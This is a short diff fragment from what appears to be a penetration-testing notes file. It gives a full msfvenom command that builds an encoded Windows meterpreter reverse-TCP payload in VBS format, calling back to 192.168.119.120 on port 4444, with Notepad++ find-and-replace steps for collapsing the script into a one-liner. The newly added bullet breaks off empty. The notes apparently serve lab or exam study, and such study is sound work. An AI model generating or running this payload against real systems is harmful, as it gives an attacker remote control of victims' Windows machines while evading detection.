@@ -25,3 +25,5 @@ Match and replace roles in Notepad++ :
 - match `\n` replace with `:` (remove newline and replace it with `:` which is the VB script command terminator)
 #### 2. Create reverse shell
 `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs`
+Match and replace roles in Notepad++ (to make the payload oneliner):
+- 
